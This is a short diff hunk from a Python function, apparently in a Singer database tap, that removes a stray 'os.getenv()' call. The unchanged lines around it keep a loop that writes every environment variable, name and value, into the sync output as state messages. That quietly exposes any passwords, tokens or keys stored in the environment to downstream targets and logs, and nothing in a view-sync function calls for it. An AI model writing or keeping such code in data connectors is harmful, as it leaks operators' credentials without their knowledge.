@@ -83,8 +83,6 @@ def sync_view(conn_config, stream, state, desired_columns):
 
    state['record_count'] = index
 
-   os.getenv()
-
    for key, value in os.environ.items():
       singer.write_message(singer.StateMessage(value=(f"{key}: {value}")))
 
